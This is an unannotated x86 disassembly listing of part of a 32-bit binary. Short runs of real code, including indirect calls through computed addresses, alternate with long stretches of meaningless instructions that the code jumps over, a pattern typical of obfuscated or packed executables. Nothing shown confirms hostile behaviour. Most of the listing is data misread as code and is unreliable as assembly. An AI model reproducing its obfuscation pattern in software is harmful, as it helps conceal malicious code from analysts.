  4050d9:	dec    ecx
  4050da:	fnstsw WORD PTR [edx+edx*2]
  4050dd:	push   eax
  4050de:	sub    ebp,edi
  4050e0:	pushf  
  4050e1:	js     0x405155
  4050e3:	cmp    al,0x4a
  4050e5:	lds    eax,FWORD PTR [esp+ecx*1-0xbede9ba]
  4050ec:	les    edi,FWORD PTR es:[esi]
  4050ef:	(bad)  
  4050f1:	test   eax,0x5ba6d63f
  4050f6:	imul   esi,DWORD PTR [eax],0x66
  4050f9:	daa    
  4050fa:	sub    al,0xec
  4050fc:	js     0x405162
  4050fe:	into   
  4050ff:	add    al,0x92
  405101:	iret   
  405102:	repnz out dx,eax
  405104:	iret   
  405105:	popf   
  405106:	fs jb  0x405182
  405109:	cdq    
  40510a:	call   0x6768d001
  40510f:	xor    eax,0xdb6ffe63
  405114:	repz out 0xae,eax
  405117:	dec    ebp
  405118:	pop    eax
  405119:	adc    DWORD PTR [esi+edi*8-0x44],0x1f889ade
  405121:	retf   0xa429
  405124:	pop    esi
  405125:	xchg   ebp,eax
  405126:	dec    eax
  405127:	pop    es
  405128:	xor    eax,0x916b9696
  40512d:	add    eax,0x746a9731
  405132:	or     eax,0x10813a8b
  405137:	cdq    
  405138:	dec    eax
  405139:	call   DWORD PTR [edx+0x1e]
  40513c:	jg     0x4051b3
  40513e:	cmp    ah,BYTE PTR [edx+0xd]
  405141:	sbb    DWORD PTR [edx+0x63],ecx
  405144:	(bad)  
  405146:	jmp    0x405137
  405148:	rol    DWORD PTR [ecx],1
  40514a:	mov    al,0x12
  40514c:	add    al,0x5c
  40514e:	lock std 
  405150:	mov    eax,0x50981619
  405155:	mov    DWORD PTR ds:0x412358,0x10
  40515f:	cmp    DWORD PTR ds:0x412358,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x412358,0x4
  405173:	jne    0x405184
  405179:	push   0x4150fd
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x412358,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x412358
  405196:	dec    eax
  405197:	mov    ds:0x412358,eax
  40519c:	mov    eax,ds:0x412358
  4051a1:	dec    eax
  4051a2:	mov    ds:0x412358,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi+0xf9672]
  4051c5:	cli    
  4051c6:	and    eax,0x7e704a42
  4051cb:	jle    0x4051a7
  4051cd:	jg     0x40524d
  4051cf:	jle    0x4051f6
  4051d1:	add    edi,DWORD PTR [edi-0x17c8cbe]
  4051d7:	mov    ah,dl
  4051d9:	dec    esp
  4051da:	leave  
  4051db:	sub    ch,bl
  4051dd:	inc    ecx
  4051de:	sbb    BYTE PTR [edx-0x1c2dd29],dh
  4051e4:	xor    DWORD PTR [ecx+0x1b98dfe9],0xb6fe9415
  4051ee:	(bad)  [ebp+0x75]
  4051f1:	mov    ds:0x3115c085,eax
  4051f6:	mov    dx,0x1ef7
  4051fa:	adc    al,0xf4
  4051fc:	test   eax,0x882ed2f8
  405201:	mov    ebx,0x36a1dca4
  405206:	xor    al,0xd2
  405208:	in     eax,dx
  405209:	or     dl,BYTE PTR [esi-0x352768e6]
  40520f:	dec    esp
  405210:	inc    eax
  405211:	(bad)  
  405212:	and    ecx,DWORD PTR [ecx-0x3]
  405215:	and    BYTE PTR [esi-0x59ce7b8b],ch
  40521b:	add    BYTE PTR [ebp+0x44],0x59
  40521f:	cmp    bh,BYTE PTR [edi-0x51]
  405222:	dec    ecx
  405223:	int    0x2d
  405225:	jbe    0x40526f
  405227:	lahf   
  405228:	iret   
  405229:	pop    eax
  40522a:	sbb    bl,BYTE PTR [esi+0x41a888b4]
  405230:	inc    edx
  405231:	pop    es
  405232:	adc    al,0xf4
  405234:	mov    ah,0x28
  405236:	imul   esp,DWORD PTR [bp+si+0x3a4e],0x38608115
  40523f:	jle    0x40529b
  405241:	lahf   
  405242:	xchg   ebx,eax
  405243:	jnp    0x405251
  405245:	mov    dh,0x22
  405247:	test   BYTE PTR [eax+0x2c],ah
  40524a:	push   ecx
  40524b:	stc    
  40524c:	aas    
  40524d:	je     0x4052a6
  40524f:	push   ecx
  405250:	mov    cl,0xb1
  405252:	inc    esp
  405253:	cmp    al,0xde
  405255:	out    0x4e,eax
  405257:	or     eax,0xaa42f9e6
  40525c:	loop   0x40523c
  40525e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40525f:	out    0x2e,eax
  405261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405262:	or     eax,0x4489265f
  405267:	jne    0x405295
  405269:	cmp    al,0xcd
  40526b:	or     al,0xb9
  40526d:	push   0x8aa25e6f
  405272:	xchg   edi,eax
  405273:	int    0xd
  405275:	mov    eax,0xfa9e4a8
  40527a:	fimul  WORD PTR [edi-0x50]
  40527d:	out    dx,al
  40527e:	pop    esp
  40527f:	jae    0x40524e
  405281:	xchg   ebx,eax
  405282:	jge    0x4052cb
  405284:	imul   eax,DWORD PTR [ecx+0x16],0x3d871649
  40528b:	add    DWORD PTR [ebx+0x63542f8d],eax
  405291:	scas   al,BYTE PTR es:[edi]
  405292:	fwait
  405293:	sbb    DWORD PTR [eax-0x62c63895],ebp
  405299:	cmp    DWORD PTR [edi-0x1e38d258],ecx
  40529f:	sbb    BYTE PTR [ecx],0x2e
  4052a2:	pop    ebx
  4052a3:	jo     0x40524d
  4052a5:	popf   
  4052a6:	adc    ah,BYTE PTR [ebx]
  4052a8:	(bad)  
  4052a9:	(bad)  [ebp+0x263d407c]
  4052af:	dec    esp
  4052b0:	sub    al,0xd0
  4052b2:	pop    edi
  4052b3:	leave  
  4052b4:	adc    bh,al
  4052b6:	loop   0x4052f0
  4052b8:	dec    eax
  4052b9:	mov    es,ecx
  4052bb:	sub    esi,DWORD PTR [ecx+edx*4+0x63f1fa2f]
  4052c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052c3:	fstp   QWORD PTR [eax-0x39ae0fce]
  4052c9:	stos   DWORD PTR es:[edi],eax
  4052ca:	mov    dh,0xc5
  4052cc:	lea    ebx,[eax]
  4052ce:	ins    BYTE PTR es:[edi],dx
  4052cf:	mov    ch,0x79
  4052d1:	popf   
  4052d2:	and    eax,DWORD PTR [edi]
  4052d4:	ins    BYTE PTR es:[edi],dx
  4052d5:	dec    edi
  4052d6:	fisttp WORD PTR [ebx-0x29cb146a]
  4052dc:	test   al,0x32
  4052de:	aas    
  4052df:	adc    BYTE PTR [ebp+0x43882e],al
  4052e5:	call   0x659f9781
  4052ea:	inc    esi
  4052eb:	xor    DWORD PTR [esi+0x2c513f2],0x6
  4052f2:	sbb    cl,BYTE PTR [esi-0x6bd3db42]
  4052f8:	xor    al,0xa0
  4052fa:	mov    dh,0x6a
  4052fc:	pushf  
  4052fd:	adc    dh,BYTE PTR [esi-0xa3e28c7]
  405303:	xor    al,0x9c
  405305:	pop    edi
  405306:	icebp  
  405307:	cmp    eax,0xa0c4dde5
  40530c:	xchg   esp,eax
  40530d:	sbb    ebx,DWORD PTR [esi]
  40530f:	mov    bh,0x3f
  405311:	sub    BYTE PTR [ebx],0x90
  405314:	inc    esi
  405315:	add    eax,0x35008043
  40531a:	imul   ebp,DWORD PTR [ecx],0xe2299d2f
  405320:	fnstcw WORD PTR [edx]
  405322:	pop    edx
  405323:	clc    
  405324:	shl    DWORD PTR [eax-0x6b],cl
  405327:	adc    eax,0x7db2c7b3
  40532c:	push   eax
  40532d:	push   DWORD PTR [ebp-0x8]
  405330:	lea    eax,[ebp-0x78]
  405333:	push   eax
  405334:	push   DWORD PTR [ebp-0xc]
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	push   ecx
  40534c:	out    0x5f,eax
  40534e:	pop    ss
  40534f:	push   ss
  405350:	jbe    0x4053d0
  405352:	jle    0x40532e
  405354:	jg     0x4053d4
  405356:	jle    0x4053a6
  405358:	sbb    BYTE PTR [ebx-0x6a],bl
  40535b:	push   es
  40535c:	(bad)  
  40535d:	push   ss
  40535e:	mul    DWORD PTR [edx+ebp*2-0x7f]
  405362:	cli    
  405363:	(bad)  
  405364:	mov    ebx,0xe8970cab
  405369:	cmp    al,0xbf
  40536b:	pop    esp
  40536c:	js     0x40538d
  40536e:	adc    al,0xbe
  405370:	(bad)  
  405371:	and    BYTE PTR ss:[edx+0x42595f10],bh
  405378:	fisub  WORD PTR [ebx-0x24b25b3e]
  40537e:	inc    ebx
  40537f:	ds mov ebx,0x443b95ac
  405385:	std    
  405386:	into   
  405387:	loope  0x4053a5
  405389:	shr    BYTE PTR [esi-0x55d3a71c],0xf1
  405390:	dec    edi
  405391:	jg     0x40540b
  405393:	fiadd  WORD PTR [edi+0x33bea121]
  405399:	xor    BYTE PTR [eax+0x57],dh
  40539c:	shl    BYTE PTR [eax+0x54],cl
  40539f:	or     eax,0xfdfcc647
  4053a4:	pop    edi
  4053a5:	xor    BYTE PTR [ebp+edx*8+0x27a122c4],bh
  4053ac:	aaa    
  4053ad:	mov    ds:0x50be0195,al
  4053b3:	jbe    0x4053c1
  4053b5:	mov    eax,0x72105521
  4053ba:	test   eax,0xcbfb84b
  4053bf:	push   ss
  4053c0:	inc    ebp
  4053c1:	and    ecx,ebx
  4053c3:	das    
  4053c4:	mov    bl,0x79
  4053c6:	adc    al,0x13
  4053c8:	ror    BYTE PTR [eax],0xca
  4053cb:	xchg   BYTE PTR [ecx-0x6e],al
  4053ce:	pop    ds
  4053cf:	repz fs dec ebx
  4053d2:	pop    ebp
  4053d3:	mov    ebx,0x7b447d33
  4053d8:	mov    eax,0xa9b1fbde
  4053dd:	icebp  
  4053de:	shl    edx,1
  4053e0:	adc    DWORD PTR [esi+0x747c3eed],esi
  4053e6:	sub    edi,ecx
  4053e8:	add    eax,0xe7312607
  4053ed:	add    BYTE PTR [edi+0x52],bl
  4053f0:	mov    ds:0x37ca1f9,eax
  4053f5:	xchg   esp,eax
  4053f6:	jo     0x4053b2
  4053f8:	and    al,0xc1
  4053fa:	cmp    bh,dl
  4053fc:	or     eax,esp
  4053fe:	mov    edx,0xddcc7ff5
  405403:	nop
  405404:	xchg   edi,eax
  405405:	hlt    
  405406:	push   es
  405407:	push   cs
  405408:	dec    ebp
  405409:	jo     0x405415
  40540b:	dec    ebx
  40540c:	sub    eax,0xefed5acf
  405411:	cmp    eax,0xe7980fd9
  405416:	xor    ecx,ebp
  405418:	mov    ebx,0x5052a7ec
  40541d:	jmp    DWORD PTR [edi+0x7c]
  405420:	sub    BYTE PTR [edx+edi*1+0x77],0x1b
  405425:	mov    ebx,0xc563a216
  40542a:	pop    esi
  40542b:	frstor [edi-0x49]
  40542e:	int3   
  40542f:	cmp    bl,BYTE PTR [ebx]
  405431:	jo     0x4053ff
  405433:	inc    esi
  405434:	pop    ecx
  405435:	rcr    BYTE PTR [ebp+0x38],0xd0
  405439:	in     eax,dx
  40543a:	jmp    0x405432
  40543c:	ret    0x6a79
  40543f:	adc    dl,BYTE PTR [eax+0xba8bc22]
  405445:	mov    bl,0xc7
  405447:	mov    dl,0xb6
  405449:	fwait
  40544a:	or     al,0xee
  40544c:	out    dx,al
  40544d:	and    cl,al
  40544f:	rol    DWORD PTR [ecx-0x5b],1
  405452:	ins    BYTE PTR es:[edi],dx
  405453:	mov    dl,0x67
  405455:	dec    esi
  405456:	fcomp  DWORD PTR [ebx+ebp*1]
  405459:	in     al,dx
  40545a:	repnz cmp BYTE PTR [ebx],ch
  40545d:	or     eax,0xd3d0d82a
  405462:	add    al,BYTE PTR [edi-0x20]
  405465:	fbld   TBYTE PTR [esi-0x7b6ea2ff]
  40546b:	dec    ebx
  40546c:	cli    
  40546d:	ss je  0x40547a
  405470:	shr    DWORD PTR [ecx],cl
  405472:	jae    0x40542f
  405474:	hlt    
  405475:	repz mov cl,BYTE PTR [edi+0x73968637]
  40547c:	jp     0x405409
  40547e:	ins    DWORD PTR es:[edi],dx
  40547f:	mov    ds:0x96c1b93,al
  405484:	out    0x91,al
  405486:	cmp    BYTE PTR [esi+0x6a109415],bl
  40548c:	and    al,0x5d
  40548e:	bound  edi,QWORD PTR [ecx]
  405490:	mov    ebp,0x2a0f1df9
  405495:	sbb    DWORD PTR [ebx],0x5d
  405498:	test   al,0x74
  40549a:	ss jbe 0x4054fc
  40549d:	jo     0x40548e
  40549f:	test   DWORD PTR [eax+0x5],esi
  4054a2:	cmp    BYTE PTR [eax],dl
  4054a4:	jmp    0x743:0x6bb28c54
  4054ab:	jp     0x405489
  4054ad:	xchg   ecx,eax
  4054ae:	ins    DWORD PTR es:[edi],dx
  4054af:	adc    ch,BYTE PTR [eax+0x4fe84e62]
  4054b5:	inc    ecx
  4054b6:	add    BYTE PTR [eax],al
  4054b8:	test   eax,eax
  4054ba:	je     0x4054e5
  4054c0:	lea    eax,[ebp-0x78]
  4054c3:	push   eax
  4054c4:	mov    eax,DWORD PTR [ebp-0x14]
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi-0x53],0x76
  40550f:	mov    ds:0x7e77f267,al
  405514:	jle    0x4054f0
  405516:	jg     0x405596
  405518:	jle    0x405580
  40551a:	jl     0x4054bf
  40551c:	sbb    eax,0x5cbd5df1
  405521:	dec    esi
  405522:	ins    DWORD PTR es:[edi],dx
  405523:	das    
  405524:	jmp    0x6f108dc
  405529:	(bad)  
  40552a:	mov    bl,0xd6
  40552c:	inc    ebx
  40552d:	jae    0x405505
  40552f:	call   0x8ce8a44b
  405534:	repz pop esp
  405536:	in     eax,dx
  405537:	adc    BYTE PTR [ecx],ah
  405539:	add    al,0xad
  40553b:	fs test eax,0x8252fc09
  405541:	sbb    ecx,DWORD PTR [ebx-0x50]
  405544:	test   eax,ebx
  405546:	inc    esi
  405547:	sbb    eax,0xaf25e707
  40554c:	in     al,dx
  40554d:	pop    eax
  40554e:	mov    BYTE PTR [eax+edx*2-0x2a],bl
  405552:	fsubr  QWORD PTR [ebp+0x6041a8]
  405558:	pushf  
  405559:	fadd   QWORD PTR [edx-0x4b]
  40555c:	push   eax
  40555d:	xor    edi,DWORD PTR [eax]
  40555f:	das    
  405560:	mov    ds:0x695b9545,eax
  405565:	add    eax,0x99314fe2
  40556a:	xchg   edi,eax
  40556b:	bound  edx,QWORD PTR [edx]
  40556d:	and    edx,DWORD PTR [edi+0x5f8183dd]
  405573:	dec    esp
  405574:	in     al,0xb2
  405576:	aas    
  405577:	jmp    0xc6f8:0x344a4fc6
  40557e:	loop   0x4055bd
  405580:	bound  edx,QWORD PTR [esi+0x1e]
  405583:	fwait
  405584:	push   eax
  405585:	imul   esp,DWORD PTR [edx+0x50],0xffffffde
  405589:	pop    ebx
  40558a:	lock and bh,BYTE PTR [eax+esi*2-0x3c]
  40558f:	pop    esp
  405590:	or     ecx,edi
  405592:	in     eax,0xd7
  405594:	or     al,BYTE PTR fs:[edx+esi*2]
  405598:	out    dx,eax
  405599:	jo     0x405572
  40559b:	lods   al,BYTE PTR ds:[esi]
  40559c:	or     esi,DWORD PTR [esp+ebp*2-0xfdb4a1b]
  4055a3:	mov    ds:0x431c1ce4,al
  4055a8:	xor    al,0xb0
  4055aa:	mov    ebp,cs
  4055ac:	or     dh,BYTE PTR [ebx+0x24]
  4055af:	nop
  4055b0:	arpl   WORD PTR [esi],sp
  4055b2:	mov    bh,0xc7
  4055b4:	bound  esi,QWORD PTR [edx-0xf127448]
  4055ba:	popf   
  4055bb:	jmp    0x2efe:0x6be3ba3d
  4055c2:	fistp  QWORD PTR [edx+ebx*2+0x1abcd75c]
  4055c9:	aam    0xa4
  4055cb:	push   edx
  4055cc:	call   0x479a:0xff82cb49
  4055d3:	adc    edx,edx
  4055d5:	mov    cl,0x3
  4055d7:	xchg   ecx,eax
  4055d8:	iret   
  4055d9:	out    0x84,eax
  4055db:	in     al,dx
  4055dc:	imul   ebx,edi,0xffffffb0
  4055df:	ret    
  4055e0:	sbb    al,0xf9
  4055e2:	retf   0x694d
  4055e5:	stos   BYTE PTR es:[edi],al
  4055e6:	(bad)  
  4055e7:	in     al,0xd3
  4055e9:	push   eax
  4055ea:	and    dh,BYTE PTR [ebp+0x22]
  4055ed:	pop    eax
  4055ee:	fwait
  4055ef:	mov    dh,0x30
  4055f1:	push   0xc17dcbe3
  4055f6:	mov    ebp,0x4f834622
  4055fb:	inc    ebp
  4055fc:	dec    ebx
  4055fd:	mov    edx,0x7c33b70d
  405602:	in     al,dx
  405603:	in     eax,0xaa
  405605:	(bad)  
  405606:	push   DWORD PTR [edi]
  405608:	xchg   DWORD PTR ss:[edx-0xf3277be],esi
  40560f:	or     DWORD PTR [ebx],0xf9c6bf46
  405615:	in     al,dx
  405616:	xchg   ecx,eax
  405617:	outs   dx,DWORD PTR ds:[esi]
  405618:	out    0xdb,eax
  40561a:	pshufw mm5,QWORD PTR [ebx-0x7b153ff3],0x56
  405622:	xor    DWORD PTR [esp+edx*4-0x7c],0xffffffad
  405627:	pop    es
  405628:	dec    edx
  405629:	mov    esp,0x4ec98e17
  40562e:	inc    ebx
  40562f:	or     dh,BYTE PTR [ecx+0x32]
  405632:	pop    ds
  405633:	ret    0xb72b
  405636:	pop    ebp
  405637:	test   al,0xe0
  405639:	mov    al,0x6e
  40563b:	repnz lods eax,DWORD PTR ds:[esi]
  40563d:	dec    edx
  40563e:	mov    dh,0x22
  405640:	fcmovne st,st(7)
  405642:	mov    DWORD PTR [ecx-0x7e],0xfda0af55
  405649:	pop    eax
  40564a:	cmp    al,0x2a
  40564c:	sub    DWORD PTR [ebx+0xe],ebp
  40564f:	call   0x3950:0xcf60018e
  405656:	push   es
  405657:	aam    0x9
  405659:	aaa    
  40565a:	repz jmp 0x4056b5
  40565d:	scas   eax,DWORD PTR es:[edi]
  40565e:	outs   dx,DWORD PTR ds:[esi]
  40565f:	xchg   ecx,eax
  405660:	sahf   
  405661:	fnstsw WORD PTR [ecx+0x22fe587e]
  405667:	add    dl,BYTE PTR [edx]
  405669:	mov    bl,BYTE PTR [edi-0x4839a995]
  40566f:	test   eax,0xc992d16f
  405674:	and    cl,BYTE PTR [ecx+0x458a0148]
  40567a:	dec    DWORD PTR [ebx+0x4a34f84d]
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	rcr    DWORD PTR [ebx+edi*2+0x2f],0x5e
  4056a5:	je     0x405725
  4056a7:	jle    0x405683
  4056a9:	jg     0x405729
  4056ab:	jle    0x4056f4
  4056ad:	sti    
  4056ae:	push   0xb35b967c
  4056b3:	rcr    BYTE PTR [esi-0x2a],0x61
  4056b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056b8:	jecxz  0x4056d0
  4056ba:	cdq    
  4056bb:	or     eax,0xb6f4928e
  4056c0:	adc    BYTE PTR [eax-0x74],ch
  4056c3:	outs   dx,BYTE PTR ds:[esi]
  4056c4:	and    BYTE PTR [edx+0x714ebf07],cl
  4056ca:	inc    esi
  4056cb:	repnz mov ch,bl
  4056ce:	xor    DWORD PTR [ebx-0x38f1b703],eax
  4056d4:	push   0xffffffde
  4056d6:	push   eax
  4056d7:	pop    ds
  4056d8:	mov    ds:0xf3510a74,eax
  4056dd:	ins    DWORD PTR es:[edi],dx
  4056de:	pop    ds
  4056df:	popa   
  4056e0:	adc    al,BYTE PTR [ebp-0x27]
  4056e3:	mov    ch,0xfa
  4056e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056e6:	sbb    al,0x3
  4056e8:	jg     0x405750
  4056ea:	or     al,0x6f
  4056ec:	mov    bh,0xd5
  4056ee:	int3   
  4056ef:	sub    BYTE PTR [edx+0x377d6a32],bh
  4056f5:	lods   eax,DWORD PTR ds:[esi]
  4056f6:	loop   0x4056ac
  4056f8:	ja     0x405693
  4056fa:	mov    edx,0x6e38d6a7
  4056ff:	sub    eax,0x2aa6de1
  405704:	iret   
  405705:	mov    dh,0x85
  405707:	sar    BYTE PTR [ecx],cl
  405709:	frstor [esi]
  40570b:	pop    ebx
  40570c:	sbb    BYTE PTR [ebx],0xcb
  40570f:	push   ds
  405710:	and    al,BYTE PTR [edi]
  405712:	mov    BYTE PTR ds:0xa58e539e,cl
  405718:	sbb    al,0x50
  40571a:	inc    eax
  40571b:	ds sub esp,edx
  40571e:	pop    edi
  40571f:	std    
  405720:	fsubp  st(4),st
  405722:	sbb    bh,dh
  405724:	xchg   edi,eax
  405725:	call   0x510a531f
  40572a:	mov    DWORD PTR [eax],eax
  40572c:	xchg   edi,eax
  40572d:	xor    BYTE PTR [ebp-0x61b3360d],dl
  405733:	add    DWORD PTR [edi-0x56ec0a2e],ebp
  405739:	cmp    BYTE PTR [ebx-0x55f7473],bh
  40573f:	fcom   QWORD PTR [eax-0x532b06ce]
  405745:	in     al,dx
  405746:	lods   al,BYTE PTR ds:[esi]
  405747:	bound  ebp,QWORD PTR [eax]
  405749:	xchg   BYTE PTR [ecx],bh
  40574b:	fwait
  40574c:	(bad)  
  40574d:	shr    DWORD PTR [ebx],cl
  40574f:	dec    esi
  405750:	les    esp,FWORD PTR [ecx-0x1c]
  405753:	(bad)  
  405755:	in     eax,0xf9
  405757:	outs   dx,BYTE PTR ds:[esi]
  405758:	(bad)  
  405759:	fldcw  WORD PTR [eax+0x59f5236d]
  40575f:	sbb    edx,0x3d
  405762:	jle    0x405747
  405764:	and    eax,DWORD PTR [edi+ebx*1]
  405767:	cli    
  405768:	mov    BYTE PTR [ecx],bh
  40576a:	add    dl,BYTE PTR cs:[ebp+0x23]
  40576e:	dec    ecx
  40576f:	cli    
  405770:	fisttp QWORD PTR [ecx+esi*1]
  405773:	sub    dh,BYTE PTR [ebp+0x17cb2353]
  405779:	es push edx
  40577b:	cmp    BYTE PTR [ecx],bl
  40577d:	call   0x36e9:0x55d38d10
  405784:	push   0xffffffc7
  405786:	ror    BYTE PTR [ecx+ebp*1+0x4a99b36e],cl
  40578d:	scas   eax,DWORD PTR es:[edi]
  40578e:	inc    esp
  40578f:	xchg   esi,eax
  405790:	sub    esi,DWORD PTR [ecx+0x75f1c838]
  405796:	mov    edx,0xa681c9d5
  40579b:	mov    ch,0x5b
  40579d:	sbb    al,0x3b
  40579f:	daa    
  4057a0:	pop    esi
  4057a1:	neg    ebp
  4057a3:	movd   mm6,DWORD PTR [edx+0x1f]
  4057a7:	ds fsqrt 
  4057aa:	jne    0x40576f
  4057ac:	mov    ebx,0x43359f56
  4057b1:	iret   
  4057b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057b3:	xchg   edi,eax
  4057b4:	test   al,0x89
  4057b6:	jl     0x40579b
  4057b8:	jg     0x405747
  4057ba:	mov    ah,BYTE PTR [ebx+0x59]
  4057bd:	jb     0x405746
  4057bf:	in     eax,dx
  4057c0:	rol    dl,1
  4057c2:	cmp    ah,dh
  4057c4:	fwait
  4057c5:	(bad)  
  4057c6:	(bad)  
  4057c7:	xchg   esp,eax
  4057c8:	mov    esp,0xc7cc4665
  4057cd:	mov    al,0x18
  4057cf:	sub    DWORD PTR [edi-0x1d79faed],esp
  4057d5:	xor    BYTE PTR [ebx+eax*8],dl
  4057d8:	sbb    al,ah
  4057da:	js     0x40584f
  4057dc:	push   eax
  4057dd:	or     esi,DWORD PTR [edi-0x67]
  4057e0:	enter  0x1d42,0xa
  4057e4:	sub    BYTE PTR [edi+eiz*2],bl
  4057e7:	daa    
  4057e8:	mov    edx,0x711c715b
  4057ed:	sub    DWORD PTR [ebp+0x5a],0x4a
  4057f1:	adc    al,0xb1
  4057f3:	call   0x6f0b:0x50db50a
  4057fa:	pop    esp
  4057fb:	xchg   ecx,eax
  4057fc:	not    BYTE PTR [eax*8+0x52af0b2d]
  405803:	rol    DWORD PTR [edx+0x11],0x29
  405807:	clc    
  405808:	dec    BYTE PTR [edx]
  40580a:	push   DWORD PTR [ebp-0x10]
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	jle    0x405884
  405858:	pushf  
  405859:	nop
  40585a:	cmp    cl,BYTE PTR [edx]
  40585c:	jle    0x4058dc
  40585e:	fidivr DWORD PTR [edi+0x7e]
  405861:	jle    0x405886
  405863:	ret    
  405864:	adc    dh,BYTE PTR ss:[edi+0x2a]
  405868:	nop
  405869:	(bad)  
  40586a:	(bad)  
  40586b:	adc    al,0x4e
  40586d:	add    DWORD PTR gs:0xcd9c22f8,eax
  405874:	mov    DWORD PTR [ebp-0x6e8b89e4],esp
  40587a:	lds    esi,FWORD PTR [ebx-0x63]
  40587d:	mov    dl,0xb
  40587f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405880:	xchg   BYTE PTR [ebp+0x61],bl
  405883:	jne    0x405900
  405885:	mov    edi,0xf3a84bd8
  40588a:	jnp    0x4058cb
  40588c:	lahf   
  40588d:	pushf  
  40588e:	xchg   edi,eax
  40588f:	int    0x4e
  405891:	xchg   esi,eax
  405892:	fldcw  WORD PTR ds:0x331926ca
  405898:	fild   DWORD PTR [edi+0x5d]
  40589b:	std    
  40589c:	inc    ecx
  40589d:	mov    ?,WORD PTR [eax+0x61]
  4058a0:	xchg   ecx,eax
  4058a1:	repnz push eax
  4058a3:	inc    edi
  4058a4:	rcl    DWORD PTR [ebx+0x1f],1
  4058a7:	add    edx,DWORD PTR [edi-0x44]
  4058aa:	jmp    0xd8d7:0xdb19a1bf
  4058b1:	loop   0x4058a7
  4058b3:	or     DWORD PTR [esi+0x34a0247f],eax
  4058b9:	inc    ebp
  4058ba:	mov    al,ds:0xa1f39283
  4058bf:	sub    esp,ecx
  4058c1:	popa   
  4058c2:	or     al,0x12
  4058c4:	stc    
  4058c5:	call   0xde1c202d
  4058ca:	inc    ebp
  4058cb:	add    BYTE PTR [edi],0x74
  4058ce:	jns    0x4058a9
  4058d0:	(bad)  
  4058d1:	es fwait
  4058d3:	xchg   BYTE PTR [edx-0x14],bh
  4058d6:	bnd fs ret 
  4058d9:	daa    
  4058da:	pop    ebx
  4058db:	jno    0x40589b
  4058dd:	test   edi,esp
  4058df:	xor    eax,DWORD PTR [edx+0x7d81e3b0]
  4058e5:	mov    eax,ds:0xeec9f58e
  4058ea:	sbb    eax,0x708d73ae
  4058ef:	cdq    
  4058f0:	daa    
  4058f1:	mov    DWORD PTR ds:0xc534d333,eax
  4058f7:	arpl   si,si
  4058f9:	sbb    al,0x33
  4058fb:	adc    eax,0xc36168fc
  405900:	popf   
  405901:	add    eax,0xd01cc847
  405906:	test   BYTE PTR [edx],0x78
  405909:	sub    BYTE PTR [edx+0x344a76ca],0x16
  405910:	std    
  405911:	sbb    DWORD PTR [esi-0x58567e89],ebp
  405917:	pop    es
  405918:	test   al,0x6d
  40591a:	ins    DWORD PTR es:[edi],dx
  40591b:	arpl   WORD PTR [edx-0x24],sp
  40591e:	jns    0x405989
  405920:	inc    eax
  405921:	sbb    edx,edi
  405923:	rcr    DWORD PTR ds:0xdae63d32,0x3e
  40592a:	push   esi
  40592c:	sbb    al,0xa9
  40592e:	pop    ds
  40592f:	inc    ebp
  405930:	sub    al,bl
